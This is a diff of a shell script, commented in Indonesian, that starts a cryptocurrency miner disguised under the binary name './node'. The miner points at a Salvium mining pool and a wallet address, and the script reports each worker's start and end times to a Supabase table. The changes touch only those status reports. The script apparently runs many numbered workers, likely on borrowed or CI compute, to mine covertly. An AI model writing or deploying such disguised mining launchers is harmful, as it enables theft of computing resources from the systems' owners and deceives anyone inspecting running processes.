@@ -18,7 +18,7 @@ URL="https://$PROJECT.supabase.co/rest/v1/worker_status"
 
 # Ambil waktu WIB (UTC+7)
 TIME=$(TZ=Asia/Jakarta date +"%H:%M")
-curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"crf_${INPUT_NUMBER}\",\"last_seen\":\"$TIME\"}"
+curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"crf_${INPUT_NUMBER}\",\"start\":\"$TIME\"}"
 
 echo "start ${INPUT_NUMBER}"
 
@@ -40,5 +40,5 @@ echo "start ${INPUT_NUMBER}"
 # salvium
 START=$(./node -a rx/0 -k --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=360000.crf_${WORKER_NUMBER} > try.log & sleep 1140 )
 
-curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"zend_crf_${INPUT_NUMBER}\",\"last_seen\":\"$TIME\"}"
+curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"crf_${INPUT_NUMBER}\",\"end\":\"$TIME\"}"
 echo "done"
